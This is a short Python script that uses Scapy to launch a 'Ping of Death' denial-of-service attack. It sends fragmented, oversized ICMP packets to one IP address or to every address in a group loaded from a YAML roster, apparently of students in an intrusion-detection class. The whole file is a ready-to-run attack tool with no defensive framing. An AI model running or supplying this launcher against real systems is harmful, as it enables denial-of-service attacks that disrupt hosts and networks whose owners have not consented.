import yaml
import argparse
from scapy.all import *
import time

# Oversized payload for PoD
PAYLOAD = "X" * 60000

def load_roster(path="ids_sec3_students.yaml"):
    """Load student groups from YAML."""
    with open(path) as f:
        return yaml.safe_load(f)

def send_pod(ip):
    """Send Ping of Death fragments to a single IP."""
    print(f"Attacking {ip}")
    pkt = IP(dst=ip)/ICMP()/PAYLOAD
    frags = fragment(pkt, fragsize=1480)
    send(frags, verbose=False)
    time.sleep(0.5)

def attack_group(group_name, roster):
    """Attack every IP in a group."""
    if group_name not in roster:
        print(f"Group '{group_name}' not found.")
        return

    for student, ip in roster[group_name].items():
        print(f"{student} → {ip}")
        send_pod(ip)

def main():
    parser = argparse.ArgumentParser(description="Ping of Death launcher")
    parser.add_argument("--target-group", help="Group name from YAML (e.g., group1)")
    parser.add_argument("--target-ip", help="Single IP address (e.g., 192.168.2.26)")
    args = parser.parse_args()

    roster = load_roster()

    if args.target_ip:
        send_pod(args.target_ip)

    if args.target_group:
        attack_group(args.target_group, roster)

    if not args.target_ip and not args.target_group:
        print("Use --target-group <name> or --target-ip <ip>")

if __name__ == "__main__":
    main()
